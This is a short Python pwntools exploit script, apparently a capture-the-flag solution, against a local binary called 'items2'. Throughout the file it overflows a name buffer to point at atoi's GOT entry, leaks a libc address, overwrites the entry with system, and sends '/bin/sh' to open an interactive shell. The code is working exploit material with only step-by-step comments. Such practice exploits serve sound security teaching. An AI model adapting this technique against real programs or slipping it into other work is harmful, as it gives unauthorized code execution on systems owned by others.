#!/usr/bin/env python3
from pwn import *

REMOTE = True
elf = ELF("./items2") # this must be run from the same folder as the binary
libc = ELF("./libc.so.6")
context.binary = elf
context.terminal = ["x-terminal-emulator", "-e"]

if REMOTE:
	p = remote("localhost", 7002)
else:
	p = process(elf.path)
	# attach(p, "continue")

p.sendlineafter(b"name:", b"klecko")

# change name, overflow and create a string with pointer to a GOT entry
p.sendlineafter(b"> ", b"4")
payload = b"A"*32 + p64(2) + p64(elf.got.atoi)
p.sendlineafter(b"name:", payload)

# print contents of GOT entry and get leak
p.sendlineafter(b"> ", b"3")
p.sendlineafter(b"Index:", b"0")
p.recvuntil(b"Data: ")
leak = p.recvline()[:-1]
print(hexdump(leak))
atoi = u64(leak + b"\x00"*2)
libc.address = atoi - libc.symbols.atoi
print(hex(libc.address))

# overwrite contents of GOT with system
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Index:", b"0")
p.sendlineafter(b"String:", p64(libc.symbols.system))

# now atoi(input) will actually call system(input).
# trigger shell sending /bin/sh
p.sendlineafter(b"> ", b"/bin/sh")

p.interactive()